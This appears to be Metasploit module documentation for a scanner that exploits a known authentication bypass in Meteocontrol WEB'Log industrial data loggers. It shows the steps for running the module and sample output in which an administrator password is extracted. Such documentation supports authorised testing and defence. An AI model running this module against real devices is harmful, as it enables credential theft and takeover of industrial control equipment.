Meteocontrol WEB'Log Data Loggers are affected with an authentication bypass vulnerability. The module exploits this vulnerability to remotely extract Administrator password for the device management portal.

Note: In some versions, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Manual verification will be required in such cases.

## Verification Steps

1. Do: ```auxiliary/scanner/http/meteocontrol_weblog_extractadmin```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Sample Output

  ```
msf > use auxiliary/scanner/http/meteocontrol_weblog_extractadmin
msf auxiliary(meteocontrol_weblog_extractadmin) > info

       Name: MeteoControl WEBLog Password Extractor
     Module: auxiliary/scanner/http/meteocontrol_weblog_extractadmin
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Karn Ganeshen <KarnGaneshen@gmail.com>

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                    yes       The target address range or CIDR identifier
  RPORT    8080             yes       The target port
  SSL      false            no        Negotiate SSL/TLS for outgoing connections
  THREADS  1                yes       The number of concurrent threads
  VHOST                     no        HTTP server virtual host

Description:
  This module exploits an authentication bypass vulnerability in 
  Meteocontrol WEBLog (all models) to extract Administrator password 
  for the device management portal.

References:
  https://ics-cert.us-cert.gov/advisories/ICSA-16-133-01
  http://cvedetails.com/cve/2016-2296/
  http://cvedetails.com/cve/2016-2298/

msf auxiliary(meteocontrol_weblog_extractadmin) > set rhosts 1.2.3.4
msf auxiliary(meteocontrol_weblog_extractadmin) > run

[+] 1.2.3.4:8080 - Running Meteocontrol WEBlog management portal...
[*] 1.2.3.4:8080 - Attempting to extract Administrator password...
[+] 1.2.3.4:8080 - Password is password
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```
